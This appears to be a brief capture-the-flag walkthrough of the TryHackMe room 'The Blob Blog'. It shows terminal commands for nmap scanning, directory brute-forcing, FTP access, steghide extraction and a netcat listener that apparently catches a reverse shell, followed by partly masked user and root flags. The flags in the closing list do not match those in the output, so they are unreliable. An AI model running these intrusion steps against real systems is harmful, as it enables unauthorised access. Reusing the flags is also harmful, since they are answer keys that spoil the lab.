...
```
bibo318@parrot:~/CTFs/tryhackme/The Blob Blog$ sudo nmap -A -sS -sC -sV -O 10.10.241.38
...
```
bibo318@parrot:~/CTFs/tryhackme/The Blob Blog$ sudo /opt/dirsearch/dirsearch.py -u 10.10.241.38 -w /usr/share/wordlists/dirb/common.txt -e html,php
[sudo] password for kali:
...
```
bibo318@parrot:~/CTFs/tryhackme/The Blob Blog$ gobuster dir -u http://10.10.241.38:445/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/The Blob Blog$ ftp 10.10.241.38
...
```
bibo318@parrot:~/CTFs/tryhackme/The Blob Blog$ steghide extract -sf cool.jpeg
Enter passphrase:
wrote extracted data to "out.txt".
bibo318@parrot:~/CTFs/tryhackme/The Blob Blog$ cat out.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/The Blob Blog$ gobuster dir -u http://10.10.241.38:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
user.txt
cat user.txt
THM{V0N318*****C0NGR4t$_g3++ing_this_fur}
...
```
bibo318@parrot:~/CTFs/tryhackme/The Blob Blog$ nc -lnvp 9002
...
# cat /root/root.txt
THM{V0N318*****G00D_J0B_G3++1NG+H3R3!}
```

1. User Flag

`THM{V0N318*****C0NGR4t$_g3++ing_this_fur12**123:))}`

2. Root Flag

`THM{V0N318*****G00D_J0B_G3++1NG+H3R3!12**123:))}`
